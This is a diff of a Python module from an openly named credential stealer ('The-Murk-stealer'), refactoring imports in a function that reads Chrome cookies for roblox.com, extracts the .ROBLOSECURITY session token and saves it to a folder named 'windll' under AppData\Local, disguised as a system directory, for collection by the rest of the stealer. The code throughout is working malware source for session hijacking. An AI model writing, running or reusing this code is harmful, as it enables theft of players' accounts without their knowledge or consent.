@@ -10,20 +10,21 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 from base64 import b64decode
-import os
+from os import makedirs,sep,environ
 
-import browser_cookie3, threading
+from browser_cookie3 import chrome
+from threading import Thread
 
 dat = ""
 
 def chrome_logger():
     try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
         try:
-            os.makedirs(rf'{pathtofile}\windll\Games\Roblox')
+            makedirs(rf'{pathtofile}\windll\Games\Roblox')
         except:
             pass
         with open(rf"{pathtofile}\windll\Games\Roblox\Roblox_info.txt", "a") as file:
@@ -36,7 +37,7 @@ def roblox(data):
     browsers = [chrome_logger]
 
     for x in browsers:
-        threading.Thread(target=x,).start()
+        Thread(target=x,).start()
     if dat != "":
         data.append(dat)
         return data
